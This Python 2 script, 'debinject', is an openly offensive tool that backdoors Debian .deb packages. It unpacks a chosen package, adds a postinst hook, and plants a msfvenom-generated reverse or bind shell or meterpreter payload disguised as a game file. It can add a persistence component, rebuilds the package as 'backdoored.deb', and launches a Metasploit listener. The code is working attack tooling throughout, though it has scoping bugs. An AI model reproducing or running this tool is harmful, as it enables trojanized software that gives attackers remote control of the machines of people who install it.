#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#      Telegram: https://t.me/UndeadSec
#
#-------------------------------
BLUE, RED, WHITE, YELLOW, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;32m', '\033[0m'
#-------------------------------
from subprocess import call
#-------------------------------
def message():
    call('clear', shell=True)
    print """

 --------------------{1}
┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
 ││├┤ ├┴┐││││ │├┤ │   │ BY: {1}Undead{2}Sec{1} from BRazil {0}
─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 
{0} --------------------{1}

""".format(GREEN, END, RED, YELLOW, GREEN)
#-------------------------------
def main():
    call('rm -Rf output', shell=True)
    call("rm -Rf /tmp/evil", shell=True)
    print '~ / Inject malicious codes into *.deb\'s\n '
    print "{0}[-] Insert *.deb file path: {1}".format(YELLOW, END)
    file_path = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
    print "\n{0}[-] Insert LHOST: {1}".format(YELLOW, END)
    LHOST = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
    print "\n{0}[-] Insert LPORT: {1}".format(YELLOW, END)
    LPORT = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
    call('mkdir /tmp/evil', shell=True)
    call('cp ' + file_path + ' /tmp/evil/original.deb', shell=True)
    call('dpkg -x /tmp/evil/original.deb /tmp/evil/work', shell=True)
    call('mkdir /tmp/evil/work/DEBIAN', shell=True)
#-------------------------------
def setArch():
    print '\nInsert the target arch x86 or x64: '
    arch = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
    if arch == 'x64':
        call('cp Utils/x64/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
    elif arch == 'x86':
        call('cp Utils/x86/control /tmp/evil/work/DEBIAN')
        call('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
    else:
        print "\nChoose [x64] or [x86]"
#-------------------------------
def setPayload():
    print "\n - CHOOSE THE PAYLOAD -  \n[1] metasploit/linux/<arch>/shell/reverse_tcp\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp\n[4] metasploit/linux/<arch>/shell/bind_tcp"
    option = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
    if option == '1':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '2':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '3':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    elif option == '4':
        call('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores', shell=True)
    else:
        print "\nInvalid"
        call('exit', shell=True)
#-------------------------------
def setPersistence():
    persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
    if persistence.upper() == 'Y':
        call('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/', shell=True)
#-------------------------------
def makeEvil():
    call('chmod 755 /tmp/evil/work/DEBIAN/postinst', shell=True)
    call('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work', shell=True)
    call('rm -Rf output/ && mkdir output', shell=True)
    call('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb', shell=True)
    print "\n The .deb backdoored saved to: /output/backdoored.deb\n"
    listen = raw_input("Do you want to start listener? (y/n): ")
    if option != '3' and option != '4':
        if listen.upper() == "Y":
            if option == '1':
	        call('service postgresql start', shell=True)
                call('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"', shell=True)
	    elif option == '2':
	        call('service postgresql start')
                call('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"', shell=True)
        else:
            print "Bye :D"
    else:
        print "\nStart Metasploit listener and Happy Hacking"
#-------------------------------
if __name__ == '__main__':
    message()
    main()
    setArch()
    setPayload()
    setPersistence()
    makeEvil()
